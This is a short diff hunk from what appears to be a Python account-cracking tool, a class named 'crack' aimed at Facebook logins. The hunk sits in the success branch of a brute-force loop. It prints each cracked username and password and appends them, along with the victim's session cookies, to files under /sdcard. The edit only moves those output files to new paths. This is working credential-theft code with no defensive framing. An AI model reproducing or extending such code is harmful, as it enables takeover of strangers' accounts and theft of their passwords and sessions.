@@ -710,8 +710,8 @@ class crack:
                     user=cok['c_user']
                     print(f"\r{HH}[OK-GSXD] {user} | {pw} {VV} ")
                     #print(f"\r{HH}#[OK-GSXD] {user} | {pw} | {coki}		 {VV}			    ")
-                    open("/sdcard/GSXD_OK.txt", "a").write(user + "|" + pw + "\n")
-                    open("/sdcard/GSXD_cokie.txt", "a").write(user + "|" + pw + " | " + coki + "\n")
+                    open("/sdcard/GS-2X-IDS/M-1 IDS/GSXD_OK.TXT", "a").write(user + "|" + pw + "\n")
+                    open("/sdcard/GS-2X-IDS/M-1 IDS/GSXD_COKIE.TXT", "a").write(user + "|" + pw + " | " + coki + "\n")
                     ok.append(user + pw)
                     break
                 elif "checkpoint" in str(cok):
